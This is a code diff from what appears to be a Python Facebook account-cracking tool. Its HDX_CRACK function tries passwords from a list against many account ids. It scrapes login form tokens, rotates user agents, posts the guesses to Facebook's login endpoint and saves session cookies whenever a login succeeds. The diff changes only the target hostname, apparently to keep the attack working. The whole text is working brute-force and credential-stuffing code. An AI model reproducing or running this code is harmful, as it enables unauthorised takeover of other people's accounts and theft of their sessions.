@@ -448,7 +448,7 @@ def HDX_CRACK(ids,passlist,tl):
             sys.stdout.write(f'\r\r\033[1;37m [FIRE-XD] %s/%s|\033[1;32mSucces:%s'%(loop,tl,len(oks)));
             sys.stdout.flush()
             ua= random.choice(ugen)
-            free_fb = session.get('https://p.facebook.com/').text
+            free_fb = session.get('https://x.facebook.com/').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -460,7 +460,7 @@ def HDX_CRACK(ids,passlist,tl):
             "pass":pas,
             "login":"Log In"}
             header_freefb = {
-            'authority': 'p.facebook.com',
+            'authority': 'x.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -475,7 +475,7 @@ def HDX_CRACK(ids,passlist,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
-            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&lwv=100&refid=9',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&lwv=100&refid=9',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
